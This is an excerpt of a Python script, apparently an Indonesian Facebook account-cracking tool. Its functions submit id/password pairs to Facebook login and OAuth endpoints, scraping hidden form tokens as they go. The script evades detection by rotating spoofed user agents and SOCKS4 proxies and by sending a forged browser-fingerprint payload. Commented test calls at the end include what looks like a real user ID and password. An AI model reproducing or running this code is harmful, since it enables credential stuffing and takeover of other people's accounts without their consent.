...
def graph_new(id,pw,host,us,pr):
    ...
    elif us == 'Vivo'    : ua = random_ua_vivo()
...
def regular_new(id,pw,host,us,pr):
    ...
    dat = {'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',     str(raq)).group(1),'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),'m_ts': re.search('name="m_ts" type="hidden" value="(.*?)"',    str(raq)).group(1),'li': re.search('name="li" type="hidden" value="(.*?)"',      str(raq)).group(1),'bi_xrwh': '0', 'try_number':'0', 'unrecognized_tries':'0','email': id , 'pass':pw,'login': 'Masuk', '_fb_noscript':'true'}
    ...
    if pr == True:
        try: pri = open('proxy/%s.json'%(waktu()),'r').read().splitlines(); pro = random.choice(pri); prx = {'http':'socks4://%s'%(pro)}
        except Exception as e: prx = None
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False, proxies=prx)
    else: pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False)
...
def validate_new(id,pw,host,us,pr):
    ...
    req = bs(r.get(url).content,'html.parser')
    raq = req.find('form',{'method':'post'})
    dat = {'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',     str(raq)).group(1),'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),'next': f'https://{host}/dialog/oauth?client_id={app}&redirect_uri={gth}','flow': 'login_no_pin', 'uid':id, 'pass':pw, 'submit':'Masuk'}
    cok = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
    cok+= perangkat
...
def async_new(id,pw,host,us,pr):
    ...
    dat = {'lsd':re.search('name="lsd" type="hidden" value="(.*?)"',     str(raq)).group(1),'jazoest':re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),'m_ts':re.search('name="m_ts" type="hidden" value="(.*?)"',    str(raq)).group(1),'li':re.search('name="li" type="hidden" value="(.*?)"',      str(raq)).group(1),'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)",',                  str(req)).group(1),'bi_xrwh':'0', 'try_number':'0', 'unrecognized_tries':'0', 'email':id , 'pass':pw, '_fb_noscript':'true','prefill_contact_point':id, 'prefill_source':'provided_or_soft_matched', 'first_prefill_source':'provided_or_soft_matched','first_prefill_type':'contact_point', 'prefill_type':'contact_point', 'had_cp_prefilled':'true', 'had_password_prefilled':'false', 'is_smart_lock':'false','bi_wvdp' :str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}')}
    cok = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
    cok+= perangkat
...
if __name__ == '__main__':
    clear()
    # print(graph_new('100008395171248','rahayu123','https://graph.facebook.com/auth/login','Vivo',False))
    # print(regular_new('100008395171248','rahayu123','m.facebook.com','Vivo',False))
    # print(validate_new('100008395171248','rahayu123','m.facebook.com','Vivo',False))
    # print(async_new('100008395171248','rahayu123','m.facebook.com','Vivo',False))
    pass
